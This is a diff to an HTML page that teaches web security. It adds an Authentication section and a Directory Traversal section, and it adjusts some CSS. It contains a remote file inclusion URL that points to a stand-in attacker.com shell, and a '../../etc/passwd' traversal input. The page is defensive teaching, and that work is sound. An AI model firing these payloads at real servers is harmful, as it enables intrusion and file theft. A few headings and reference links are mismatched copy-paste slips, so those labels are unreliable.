@@ -192,7 +192,7 @@
         /* Main Content */
         .main-content {
             flex: 1;
-            padding: 2rem;
+            padding: 1rem;
             overflow-y: auto;
         }
 
@@ -200,7 +200,7 @@
             background: white;
             border-radius: 16px;
             box-shadow: var(--card-shadow);
-            padding: 2.5rem;
+            padding: 1.5rem;
             overflow: hidden;
             max-width: 1000px;
             margin: 0 auto;
@@ -208,8 +208,8 @@
 
         .intro-section {
             text-align: center;
-            margin-bottom: 3rem;
-            padding-bottom: 2rem;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
             border-bottom: 1px solid var(--light-gray);
         }
 
@@ -264,7 +264,7 @@
         }
 
         .warning-box {
-            background: #FFA2A2;
+            background: #f8d7da;
             border-left: 4px solid var(--danger);
             padding: 1.5rem;
             border-radius: 8px;
@@ -279,13 +279,13 @@
             margin: 1.5rem 0;
         }
 
-        .danger-box {
+/*        .danger-box {
             background: #f8d7da;
             border-left: 4px solid var(--danger);
             padding: 1.5rem;
             border-radius: 8px;
             margin: 1.5rem 0;
-        }
+        } */
 
         .remediation-box {
             background: #d1ecf1;
@@ -471,6 +471,7 @@
     <aside class="sidebar">
         <h3 class="nav-title"><i class="fas fa-list"></i> OWASP Security Topics</h3>
         <ul class="topic-list">
+            <li><a href="#authentication" class="active"><i class="fas fa-chevron-right"></i>Authentication</a></li>
             <li><a href="#privilege-escalation-via-froce-browsing" class="active"><i class="fas fa-chevron-right"></i>Privilege Escalation Via Force Browsing</a></li>
             <li><a href="#privilege-escalation-via-backend" class="active"><i class="fas fa-chevron-right"></i>Privilege Escalation Via Backend</a></li>
             <li><a href="#privilege-escalation-via-response-manipulation" class="active"><i class="fas fa-chevron-right"></i>Privilege Escalation Via Response Manipulation</a></li>
@@ -486,6 +487,7 @@
             <li><a href="#file-upload"><i class="fas fa-chevron-right"></i> File Upload Security</a></li>
             <li><a href="#local-file-inclusion"><i class="fas fa-chevron-right"></i> Local File Inclusion</a></li>
             <li><a href="#remote-file-inclusion"><i class="fas fa-chevron-right"></i> Remote File Inclusion</a></li>
+            <li><a href="#directory-traversal"><i class="fas fa-chevron-right"></i> Directory Traversal</a></li>
 
             
             
@@ -506,6 +508,65 @@
             <div class="intro-section">
                 <h1>Build Better Web</h1>
                 <p>A comprehensive guide to implementing security best practices for modern web applications. Learn how to protect your applications from common vulnerabilities and build more secure software.</p>
+            </div>
+
+        <!-- Topic 1: Authentication -->
+            <div id="authentication" class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-icon">
+                        <i class="fas fa-file-upload"></i>
+                    </div>
+                    <h2>1. Authentication</h2>
+                </div>
+                
+                <h3>📌Authentication</h3>
+                <p>Authentication vulnerabilities occur when login or identity verification mechanisms are weak or misconfigured. They can let attackers impersonate users, steal data, or take over accounts. The fix is strong password policies, multi-factor authentication, secure session handling, and regular monitoring.</p>
+                <p>This occurs because the web application does not properly check user permissions before showing sensitive pages or data.</p>
+                
+                <div class="example-box">
+                    <h3>🔑 Types of Authentication Vulnerabilities</h3>
+                    <p><b>Weak Passwords</b> – Users choose simple or reused passwords that attackers can guess or brute-force.</p>
+                    <p><b>Credential Stuffing</b> – Attackers use stolen username/password pairs from other breaches to log in.</p>
+                    <p><b>Brute Force Attacks</b> – Automated attempts to guess passwords until successful.</p>
+                    <p><b>Session Hijacking</b> – Attackers steal session tokens/cookies to impersonate users.</p>
+                    <p><b>Broken Authentication</b> – Poor implementation of login, password reset, or session management.</p>
+                    <p><b>Default Credentials</b> – Systems shipped with default usernames/passwords (e.g., “admin/admin”).</p>
+                    <p><b>Missing Multi-Factor Authentication (MFA)</b> – Reliance only on passwords makes accounts easier to compromise.</p>
+                </div>
+
+                <div class="warning-box">
+                    <h3>💥 Impact of the Issue</h3>
+                    <p><b>Account Takeover</b> – Attackers gain full access to user accounts.</p>
+                    <p><b>Data Breach</b> – Sensitive information (personal, financial, health data) is exposed.</p>
+                    <p><b>Financial Loss </b>– Fraudulent transactions or ransom demands.</p>
+                    <p><b>Reputation Damage </b> – Loss of customer trust and regulatory penalties.</p>
+                    <p><b>Regulatory Fines</b> – Non-compliance with standards like GDPR, HIPAA, or PCI DSS.</p>
+                </div>
+                
+                <div class="attack-scenario-box">
+                    <h3>🎭 Attacker Scenarios & Examples</h3>
+                    <p><b>Credential Stuffing Attack:</b> An attacker uses leaked credentials from another site to log into a banking app.</p>
+                    <p><b>Brute Force Attack:</b> Automated scripts try thousands of password combinations until they succeed.</p>
+                    <p><b>Session Hijacking:</b> A hacker intercepts a session cookie over unsecured Wi-Fi and impersonates the user.</p>
+                    <p><b>Phishing + Weak Authentication:</b> A user clicks a fake login link; without MFA, the attacker logs in easily.</p>
+                    <p><b>Default Credentials Exploit:</b> IoT devices with unchanged factory passwords are taken over by botnets.</p>
+                </div>
+
+                <div class="remediation-box">
+                    <h3>🛠️ Remediation (How to Fix It)</h3>
+                    <p><b>Strong Password Policies</b> – Enforce complexity, length, and rotation.</p>
+                    <p><b>Multi-Factor Authentication (MFA)</b> – Add extra verification like SMS, authenticator apps, or biometrics.</p>
+                    <p><b>Rate Limiting & Lockouts</b> – Prevent brute-force attempts by limiting login retries.</p>
+                    <p><b>Secure Session Management</b> – Use HTTPS, regenerate session IDs, and set secure cookie flags.</p>
+                    <p><b>Monitor & Alert</b> – Detect unusual login attempts or geographic anomalies.</p>
+                    <p><b>Disable Default Accounts</b> – Remove or change default credentials immediately.</p> 
+                    <p><b>Regular Security Testing</b> – Penetration testing and vulnerability scans.</p>
+                </div>
+                                
+                <h3>🔗 Reference Links:</h3>
+                <p><a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control</a></p>
+                <p><a href="https://sudip-says-hi.medium.com/missing-function-level-access-control-a773990d8a63">https://sudip-says-hi.medium.com/missing-function-level-access-control-a773990d8a63</a></p>
+                <p><a href="https://www.geeksforgeeks.org/computer-networks/how-to-prevent-broken-access-control/">https://www.geeksforgeeks.org/computer-networks/how-to-prevent-broken-access-control/</a></p>
             </div>
 
             <!-- Topic 1: Privilege Escalation via Force Browsing -->
@@ -800,6 +861,7 @@ Results for "apple"
                 <p><a href="https://web.dev/articles/csp">https://web.dev/articles/csp</a></p>
                 <p><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">https://portswigger.net/web-security/cross-site-scripting/reflected</a></p>
             </div>
+        </div>
 
         <!-- Topic 5: Stored Cross-Site Scripting -->
             <div id="stored-cross-site-scripting" class="topic-card">
@@ -1302,7 +1364,6 @@ factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
                 <p><a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a></p>
                 <p><a href="https://www.imperva.com/learn/application-security/xxe-xml-external-entity/">https://www.imperva.com/learn/application-security/xxe-xml-external-entity/</a></p>
             </div>
-        </div>
 
     <!-- Topic 10: SSI Injection -->
         <div id="ssi-injection" class="topic-card">
@@ -1755,6 +1816,57 @@ http://victim.com/index.php?page=http://attacker.com/shell.php
                 <p><a href="https://zerothreat.ai/blog/remote-file-inclusion-the-security-threat-you-might-be-ignoring">https://zerothreat.ai/blog/remote-file-inclusion-the-security-threat-you-might-be-ignoring</a></p>
                 <p><a href="https://letsdefend.io/blog/how-to-detect-lfi-and-rfi-attacks">https://letsdefend.io/blog/how-to-detect-lfi-and-rfi-attacks</a></p>
             </div>
+
+        <!-- Topic 14: Directory Traversal -->
+            <div id="directory-traversal" class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-icon">
+                        <i class="fas fa-file-upload"></i>
+                    </div>
+                    <h2>14. Directory Traversal</h2>
+                </div>
+                
+                <h3>📌 Remote File Inclusion (RFI)</h3>
+                <p>Directory traversal occurs when attackers exploit insecure file path handling in web applications.</p>
+                <p>By inserting sequences like ../ (dot-dot-slash), attackers can “climb” out of the web root directory and access restricted files.</p>
+                <b>Example Input:</b>
+<pre>
+http://example.com/getFile?name=../../etc/passwd
+</pre>
+                <p>This could trick the server into returning the system’s password file.</p>
+                
+                <div class="warning-box">
+                    <h3>⚠️ Impact of the Issue</h3>
+                    <p><b>Data Exposure:</b> Attackers can read sensitive files (e.g., /etc/passwd, application source code, API keys).</p>
+                    <p><b>System Compromise:</b> If write permissions exist, attackers may overwrite files or inject malicious code.</p>
+                    <p><b>Application Manipulation:</b> Access to configuration files may allow bypassing authentication or escalating privileges.</p>
+                    <p><b>Regulatory Risk:</b> Breaches of personal data can lead to compliance violations (GDPR, HIPAA, etc.).</p>
+                </div>
+
+                <div class="attack-scenario-box">
+                    <h3>🎭 Attacker Scenarios & Examples</h3>
+                    <p><b>Sensitive File Disclosure:</b> An attacker retrieves /etc/passwd on a Linux server to enumerate users.</p>
+                    <p><b>Application Source Code Theft:</b> Accessing ../../app/config.php to steal database credentials.</p>
+                    <p><b>Log File Manipulation:</b> Overwriting log files to hide malicious activity.</p>
+                    <p><b>Real-World Example:</b> Directory traversal was used in attacks against older versions of Apache Tomcat and PHP applications, where improper input sanitization exposed system files.</p>
+                </div>
+                
+                <div class="remediation-box">
+                    <h3>🛠️ Remediation</h3>
+                    <p><b></b>Input Validation: Sanitize and validate all user-supplied file paths.</p>
+                    <p><b></b>Use Whitelisting: Allow access only to explicitly permitted files/directories.</p>
+                    <p><b></b>Avoid Direct File Access: Map user requests to internal identifiers instead of raw file paths.</p>
+                    <p><b></b>Least Privilege: Run applications with minimal OS permissions to limit damage.</p>
+                    <p><b></b>Web Application Firewall (WAF): Detect and block suspicious path traversal attempts.</p>
+                    <p><b></b>Regular Security Testing: Conduct penetration tests and code reviews to catch vulnerabilities.</p>
+                </div>
+                
+                <h3>📚 Reference Links:</h3>
+                <p><a href="https://brightsec.com/blog/directory-traversal-attack/">https://brightsec.com/blog/directory-traversal-attack/</a></p>
+                <p><a href="https://www.intigriti.com/researchers/hackademy/directory-traversal">https://www.intigriti.com/researchers/hackademy/directory-traversal</a></p>
+                <p><a href="https://www.imperva.com/learn/application-security/directory-traversal/">https://www.imperva.com/learn/application-security/directory-traversal/</a></p>
+            </div>
+
 
 
             <!-- Topic 15: Security Headers -->
